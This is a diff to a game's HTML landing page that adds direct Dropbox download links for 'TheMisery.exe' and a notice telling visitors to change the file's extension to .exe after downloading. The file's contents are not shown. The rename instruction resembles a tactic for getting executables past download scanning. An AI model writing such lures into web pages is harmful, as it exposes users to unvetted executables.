@@ -57,8 +57,11 @@
         .the-text { font-size: 38px; font-weight: 900; letter-spacing: 22px; color: #836fff; margin-bottom: -15px; margin-left: 22px; opacity: 0.9; }
         h1 { font-size: clamp(60px, 12vw, 150px); letter-spacing: 45px; font-weight: 900; margin-right: -45px; text-shadow: 0 0 40px rgba(131,111,255,0.5); margin-bottom: 40px; }
         
-        .main-dl { background: #836fff; color: #000; padding: 18px 60px; text-decoration: none; font-weight: 900; font-size: 16px; letter-spacing: 4px; transition: 0.3s; border-radius: 2px; }
+        .main-dl { background: #836fff; color: #000; padding: 18px 60px; text-decoration: none; font-weight: 900; font-size: 16px; letter-spacing: 4px; transition: 0.3s; border-radius: 2px; margin-bottom: 15px; }
         .main-dl:hover { background: #fff; transform: scale(1.05); box-shadow: 0 0 30px #836fff; }
+        
+        /* Yeni eklediğimiz uyarı notu stili */
+        .dl-hint { font-size: 11px; color: #888; letter-spacing: 1px; font-weight: 700; opacity: 0.7; max-width: 500px; line-height: 1.4; }
 
         .gameplay-container { width: 100%; max-width: 900px; margin: 0 auto; border: 2px solid #1a1a1a; position: relative; cursor: pointer; background: #000; transition: 0.4s; }
         .gameplay-container:hover { border-color: #836fff; }
@@ -101,11 +104,16 @@
         <div class="nav-links">
             <a href="#home">Home</a><a href="#gameplay">Gameplay</a><a href="#story">Story</a><a href="#features">Features</a><a href="#gallery">Archives</a>
         </div>
-        <a href="DROPBOX_LINK" class="top-dl">DOWNLOAD NOW</a>
+        <a href="https://www.dropbox.com/scl/fi/m3de2miscz545h2q9r0qo/TheMisery.exe?rlkey=z0jlpqvrrns7z2qqsi4p1gwgo&st=74w60xss&dl=1" class="top-dl">DOWNLOAD NOW</a>
     </nav>
 
     <div class="container">
-        <section id="home"><div class="the-text">THE</div><h1>MISERY</h1><a href="DROPBOX_LINK" class="main-dl">DOWNLOAD NOW</a></section>
+        <section id="home">
+            <div class="the-text">THE</div>
+            <h1>MISERY</h1>
+            <a href="https://www.dropbox.com/scl/fi/m3de2miscz545h2q9r0qo/TheMisery.exe?rlkey=z0jlpqvrrns7z2qqsi4p1gwgo&st=74w60xss&dl=1" class="main-dl">DOWNLOAD NOW</a>
+            <div class="dl-hint">Notice: Files are encrypted for terminal safety. Change extension to .exe after download to initialize setup.</div>
+        </section>
 
         <section id="gameplay">
             <div class="label">Live Gameplay Feed</div>
